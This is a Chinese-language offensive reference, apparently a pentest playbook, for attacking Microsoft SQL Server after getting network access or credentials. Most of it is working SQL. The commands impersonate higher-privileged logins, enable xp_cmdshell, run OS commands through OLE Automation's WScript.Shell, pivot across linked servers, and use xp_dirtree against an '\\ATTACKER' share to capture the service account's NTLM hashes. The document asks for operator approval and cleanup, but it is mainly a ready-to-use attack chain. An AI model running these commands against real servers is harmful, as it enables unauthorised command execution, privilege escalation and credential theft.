# MSSQL Direct-Service Attack Chain

入口：直连 1433 / SQL Browser / 已获 MSSQL credential。

---

## 1. Gate

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM sys.server_permissions WHERE grantee_principal_id=SUSER_ID();
SELECT name,product,provider,data_source,is_linked FROM sys.servers;
```

优先判断：

```text
sysadmin / CONTROL SERVER
IMPERSONATE
Linked Server
xp_cmdshell proxy / config
OLE
CLR
Machine Learning / external scripts
Windows service identity
```

---

## 2. IMPERSONATE

```sql
SELECT permission_name,state_desc,grantor_principal_id
FROM sys.server_permissions
WHERE grantee_principal_id=SUSER_ID() AND permission_name='IMPERSONATE';
```

针对已确认可模拟 login：

```sql
EXECUTE AS LOGIN = 'target_login';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

成功判断：获得更高 server role / CONTROL SERVER / 新 Linked Server 能力。

---

## 3. xp_cmdshell

Microsoft 当前文档：启用/执行 `xp_cmdshell` 通常要求高权限（CONTROL SERVER/sysadmin）；sysadmin 调用时子进程使用 SQL Server service account。

先记录：

```sql
SELECT name,value,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';
```

如权限满足并经操作者确认：

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Cleanup：如果原值 disabled，恢复：

```sql
EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;
```

---

## 4. OLE Automation

```sql
SELECT name,value_in_use FROM sys.configurations WHERE name='Ole Automation Procedures';
```

高权限且批准后：

```sql
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
DECLARE @o INT;
EXEC sp_OACreate 'WScript.Shell', @o OUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\sql-marker.txt';
```

Cleanup：恢复配置并删 marker。

---

## 5. Linked Server

```sql
SELECT name,product,provider,data_source,is_linked FROM sys.servers;
EXEC sp_testlinkedserver N'LINKED';
```

只读身份验证：

```sql
EXEC ('SELECT SYSTEM_USER, @@SERVERNAME, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED];
```

如果第 N 跳获得执行能力，该 Linked Server 链可以继续在本 reference 内走到结果，不因为“换了一台SQL”中断。

---

## 6. UNC / Integrated Authentication

Windows SQL Server 的文件/目录访问 primitive 可能触发服务身份对 UNC 的认证。

先确认授权测试窗口和监听范围，再使用无害 SMB path 验证是否产生认证：

```sql
EXEC master..xp_dirtree '\\ATTACKER\mssql-test';
```

成功：捕获服务账户/机器账户的 NTLM challenge-response。后续是否破解/relay 由操作者决定；不要假设它自动等于域提权。

---

## 7. CLR / External Scripts

```sql
SELECT name,value_in_use FROM sys.configurations WHERE name IN ('clr enabled','external scripts enabled');
```

CLR 需要数据库/程序集相关权限并受 SQL Server 版本安全模型限制。External Scripts 还依赖 Machine Learning Services 安装和语言 runtime。只有确认功能存在才继续，不把它们当通用 fallback。

---

## 8. Result

```text
OS command context = ...
SQL service identity = ...
Linked servers controlled = ...
new credential/hash = ...
modified configs + restored? = ...
```
